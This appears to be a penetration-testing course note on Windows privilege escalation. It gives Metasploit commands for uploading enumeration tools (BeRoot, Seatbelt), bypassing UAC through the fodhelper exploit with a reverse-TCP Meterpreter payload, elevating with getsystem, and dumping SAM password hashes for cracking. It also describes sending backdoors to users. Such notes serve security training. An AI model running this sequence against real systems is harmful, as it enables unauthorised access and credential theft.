# Escalate Privileges

Perform escalate privileges by using user account passwords obtained in the first step of system hacking. In privileges escalation, you will attempt to gain system access to the target system, and then try to attain higher-level privileges within that system. In this step, you will use various privilege escalation techniques such as named piped impersonation, misconfigured service exploitation, pivoting, and relaying to gain higher privileges to the target system.

Privilege escalation is the process of gaining more privileges than were initially acquired. Here, you can take advantage of design flaws, programming errors, bugs, and configuration oversights in the OS and software application to gain administrative access to the network and its associated applications.

Backdoors are malicious files that contain Trojan or other infectious application that can either halt the current working state of a target machine or even gain partial or complete control over it. Here, you need to build such backdoors to gain remote access to the target system. You can send these backdoors through email, file-sharing web applications, and shared network drives, among other methods, and entice the users to execute them.

Privileges are a security roles assigned to users for specific programs, features, OSes, functions, files, or codes. They limit access by type of user. Privilege escalation is required when you want to access system resources that you are not authorized to access. It takes place in two forms: vertical privilege escalation and horizontal privilege escalation.&#x20;

* **Horizontal Privilege Escalation**: An unauthorized user tries to access the resources, functions, and other privileges that belong to an authorized user who has similar access permissions.&#x20;
* **Vertical Privilege Escalation**: An unauthorized user tries to gain access to the resources and functions of a user with higher privileges such as an application or site administrator.

***

## Privilege Escalation tools and Exploit Client-side Vulnerabilities

Privilege escalation tools such as **BeRoot** and **GhostPack Seatbelt** allow you to run a configuration assessment on a target system to find information about the underlying vulnerabilities of system resources such as services, file and directory permissions, kernel version, and architecture (Also **LinPEAS**). Using this information, you can find a way to further exploit and elevate the privileges on the target system.

Exploiting client-side vulnerabilities allows you to execute a command or binary on a target machine to gain higher privileges or bypass security mechanisms. Using these exploits, you can further gain access to privileged user accounts and credentials.

### BeRoot

Allow to run a configuration assessment on a target system to find out information about its underlying vulnerabilities, services, file and directory permissions, kernel version, architecture, as well as other data. Using this information, you can find a way to further exploit and elevate the privileges on the target system.

1. Upload the application beRoot.exe

If using metasploit, type:

```
upload /path/to/file/beRoot.exe
```

2. Run the file&#x20;

The result appears, displaying information about service names along with their permissions, keys, writable directories, locations, and other vital data. Can further scroll down to view the information related to startup keys, task schedulers, WebClient vulnerabilities, and other items.

Can find further vulnerabilities in the resulting services and attempt to exploit them to escalate your privileges in the target system. Windows privileges can be used to escalated privileges. These privileges include **SeDebug, SeRestore & SeBackup & SeTakeOwnership, SeTcb & SeCreateToken, SeLoadDriver, and SeImpersonate & SeAssignPrimaryToken.**

### **GhostPack Seatbelt**

To gather host information and perform security checks to find insecurities in the target system.

If using metasploit, type:

```
upload /path/to/file/Seatbelt.exe
shell
```

when the shell already changed, type below to gather information about AMSIProviders, **AntiVirus**, **AppLocker** etc.

```
Seatbelt.exe -group=system
```

Type below to gather information about **ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys,** etc.

```
Seatbelt.exe -group=user
```

Type below to gather information about **ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc.**

```
Seatbelt.exe -group=misc
```

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

### Bypass User Account Control (UAC) setting: Named Pipe Impersonation Technique

to escalate the privileges using the Named Pipe Impersonation Technique. In metasploit, type:

```
run post/windows/gather/smart_hashdump
```

If the meterpreter require admin privileges to perform such actions, try to escalate the privileges by issuing a **getsystem** command to attempts to elevate the user privileges.

```
getsystem -t 1
```

if access denied, try to bypass the UAC setting that is blocking from gain unrestricted access.

Bypass **Windows UAC Protection** via **FodHelper Registry Key**.

Type **background** to to move aside the session first, do this and configure the options.

```
use exploit/windows/local/bypassuac_fodhelper
show options
```

observe that the **SESSION** is required, type:

```
set SESSION 2
```

Make sure to configure the payload to **windows/meterpreter/reverse\_tcp.**

type **exploit** or **run** to begin exploit the UAC.

```
set payload windows/meterpeter/reverse_tcp
exploit
```

If the UAC exploit successfully bypassed, type:

```
getuid # check the status of current user ID
getsystem -t 1 # re-issue command to elevate privileges
```

Now try to obtain password hashes located in the SAM file. Now this has successfully extracts the NTLM hashes and display them. Can further crack these password hashes to obtain plaintext passwords.

```
run post/windows/gather/smart_hashdump
```



